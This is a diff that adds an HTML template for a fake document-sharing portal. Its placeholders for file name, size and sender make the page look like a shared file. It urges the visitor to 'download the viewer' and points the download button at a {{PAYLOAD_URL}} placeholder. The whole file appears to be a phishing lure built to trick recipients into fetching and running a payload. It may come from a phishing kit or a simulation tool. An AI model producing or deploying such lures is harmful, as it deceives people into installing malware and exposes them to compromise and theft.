@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Share - Document Portal</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #fafafa; padding: 50px; }
+        .container { max-width: 600px; margin: 0 auto; background: white; border: 1px solid #ddd; padding: 30px; border-radius: 5px; }
+        .file-info { display: flex; align-items: center; margin-bottom: 20px; }
+        .file-icon { font-size: 40px; margin-right: 20px; color: #ff5722; }
+        .file-name { font-weight: bold; font-size: 18px; }
+        .download-btn { display: inline-block; padding: 15px 30px; background-color: #4caf50; color: white; text-decoration: none; border-radius: 3px; font-weight: bold; }
+        .download-btn:hover { background-color: #45a049; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="file-info">
+            <div class="file-icon">📄</div>
+            <div>
+                <div class="file-name">{{FILE_NAME}}</div>
+                <div style="color: #888; font-size: 14px;">Size: {{FILE_SIZE}} | Shared by: {{SENDER}}</div>
+            </div>
+        </div>
+        <p>You have been invited to view this document. Please download the viewer to access the protected content.</p>
+        <center>
+            <a href="{{PAYLOAD_URL}}" class="download-btn">Download & View Document</a>
+        </center>
+    </div>
+</body>
+</html>
